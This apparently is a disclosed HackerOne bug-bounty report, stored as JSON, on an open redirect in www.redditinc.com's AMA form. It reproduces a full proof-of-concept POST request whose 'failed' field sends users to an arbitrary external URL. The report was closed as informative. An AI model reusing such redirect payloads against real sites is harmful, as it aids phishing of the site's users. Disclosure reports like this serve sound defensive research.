@@ -1,0 +1,128 @@
+{
+  "id": 1310230,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzEwMjMw",
+  "url": "https://hackerone.com/reports/1310230",
+  "title": "Open Redirect through POST Request in www.redditinc.com",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2021-08-18T16:48:05.819Z",
+  "submitted_at": "2021-08-18T16:48:06.007Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kratul",
+    "url": "/kratul",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6Mjk1MDY1NywicHVyIjoiYmxvYl9pZCJ9fQ==--3624230d44676b3cba1ef5d2fb3e819eee23e1ef/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--a4d91faed3dff6024dfc1a7b7f8ccc6b45e38396/Profile%20pic%201.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-07-08T19:02:01.542Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-08T18:57:53.183Z",
+  "team_member_agreed_on_going_public_at": "2022-07-08T19:02:01.434Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nOpen redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.\n\n## Steps To Reproduce:\nRequests are sent from Burp Suite Community Edition\n\n  1. Intercept Request of www.redditinc.com\n  2. Send it to Repeater.\n  3. Paste the HTTP Request given.\n  4. Send.\n  5. Copy link from the Show Response in Browser option.\n  6. Paste it in Burp Browser and Run.\n\n##Reference/Supporting Material:\n[https://hackerone.com/reports/242243](https://hackerone.com/reports/242243)\n\n## POC Video is attached\n\n\n\n## HTTP Request:\n```\nPOST /ama HTTP/2\nHost: www.redditinc.com\nContent-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw\nCookie: OptanonAlertBoxClosed=2021-08-18T14:18:57.720Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Aug+18+2021+19%3A48%3A59+GMT%2B0530+(India+Standard+Time)&version=6.13.0&hosts=&consentId=bca87c2e-056e-4636-b582-be4622de55db&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip,deflate\nContent-Length: 1509\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36\n\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"action\"\n\nzendesk/default/submit\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"agreement\"\n\nyes\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"description\"\n\n555\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"email\"\n\nsample@email.tst\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"email_confirm\"\n\nsample@email.tst\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"failed\"\n\nhttp://google.com\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"name\"\n\nghovjnjv\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"organization\"\n\nPENTESTING\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"participants\"\n\nghovjnjv\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"redirect\"\n\n74bcbfb4f9c047fb4e467dd203ca3b30f2b31216551ab9db2bf44911c029d506thank-you/ama-form-step-1\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"subject\"\n\nAMA Request\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"success\"\n\nthank-you/ama-form-step-1\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"ticket_form_id\"\n\n360000307211\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"timeframe\"\n\nnext-week\n------------YWJkMTQzNDcw\nContent-Disposition: form-data; name=\"timezone\"\n\n(GMT-05:00) Eastern Time (US & Canada)\n------------YWJkMTQzNDcw--\n\n```\n\n\n\n## HTTP Response:\n```\nHTTP/2 302 Found\nServer: nginx\nContent-Type: text/html; charset=UTF-8\nPermissions-Policy: interest-cohort=()\nX-Robots-Tag: none\nX-Powered-By: Craft CMS\nLocation: http://google.com\nCache-Control: private\nAccept-Ranges: bytes\nDate: Wed, 18 Aug 2021 15:30:48 GMT\nVia: 1.1 varnish\nStrict-Transport-Security: max-age=31536000; includeSubdomains\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Xss-Protection: 1; mode=block\nContent-Length: 0\n```\n\n## Impact\n\nA remote attacker can redirect users from your website to a specified URL. This problem may assist an attacker to conduct phishing attacks, trojan distribution, spammers.",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1416792,
+      "file_name": "Open_Redirect_through_POST_Request.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i4fvz01tdt6nths4vltjnr53nvwx?response-content-disposition=attachment%3B%20filename%3D%22Open_Redirect_through_POST_Request.mp4%22%3B%20filename%2A%3DUTF-8%27%27Open_Redirect_through_POST_Request.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSTQAVQP4%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T231704Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQCTUONg8rOgt0jJ%2F3TrAqfnw601jJWVPfXifsk%2FW%2BLK7QIhAMGGDYfFDmVKxAob%2BionYCWkghzARXsi80rujTijS1y1KrsFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx94JKvjDXdvmt2Z5YqjwUIZSeIw%2FwdcJm5YM7%2Fzj2Nb7%2BL07VSGrwZcrAFdg553eL0%2BZAQc76fk8Ex7l6Uf%2F3ikVcxL9ziiMsVIXtsj7Ng8u8JV%2ByqYngvufFEBqwmF0v1BH9rqMO7LF6urIIWOASyXaCQ3X%2BY1tUJxe37UXfc17QXjdbJGxNuVHVgClJYS7PV2V%2B%2FsJFxLRAeN%2BR%2FJSwGltigg5dYzBvuce3MqykGzHR%2FsIRYBwuyQ5faPmbZQT96kayjFLZs%2B7NNWtW9VgHP%2B%2FX5nGFQg%2BEyAPH4ocZ%2BHEQesKz1xFaKagmxSdiKW2TWlS7j3BmjeA4GLFHGXPYvGuSHZXkIlnlynUpViNaMRooYDcZ469KjIMZ52msg5uTSTqZH8RN71i75ZXUowtuEG6lCR225YRPUH7aNh%2B6SYx%2B%2Fiq9rI%2BWz2tWEni9GPcBiEYCHY4vvOwSVSEeYnlKMBV9ePkwk4EuvYdcDMllyXcvrVxpLuB%2BqKQ3pPl4CZ5Q361PbRVYMPJUY%2Bgtwj7wGQlO6lyO5Lt6ALg2g0LYqYKYvbB6qZ0KCguD4y%2Bk%2FLBW0oYXNn4jN5D6C7o8AshcXjt7U1s6RnEx%2F0g373zMFJ37i%2BmWwhX4bGvnjWdwLQw03OtJhLCC4NqXrJhFxybk5wTHwa%2FzSSrB%2FHW8uAIvBzBI4UAYwtMklIHgi3gTQKQ%2FdhUNRAZlbxyZHNTeR4XWsNTXmsBAuW%2FyUHWgxsWzvy5BY%2B%2FrTdU1qqyaIheuZkpahjVk4NFY6nuc3pITKxMyqi98hhRiVAhgRebro9ayUQc1ph9hfQlK%2FYtHa3IDyEacxkXteXUJY6SNCmAkTWRQy18FEIU%2Fwcj0iPZEL8TXqsOZcfO8h7JQheRzqIHIKMPWJvMYGOrAB%2FG5iWehhltchMJFe0uyAuUiK5LT9GEHYkAXnr89MJSI5Cbs4afjg0tB9hGrwm5w61IusnmMYEWeN6kzojlt7qZ6MLbqHlPnVfWq78NdihXFuDtuVoSz8jxC%2FA79MlEjp%2Bcne1ic8SOAztDSoLuVM6FQuc8AKWiQbievmOjsXXNF3Goxsgkv4tPjXu52e2zlnyfoMEzgXb40sGah%2FuFrbe%2FCgc%2F3oFfp11VPwBr33XYo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f5a9709ea651c44b1ea376f6dbefdac7f0a561e55da4482f49e40203fb8fbd47",
+      "file_size": 6072149,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "tinmo",
+    "alp",
+    "zy9ard3",
+    "spaghettisec",
+    "k0mi",
+    "shivammusic",
+    "lumbridge7",
+    "aasim690",
+    "raceymcracerson",
+    "nightraven__"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18828,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.redditinc.com",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
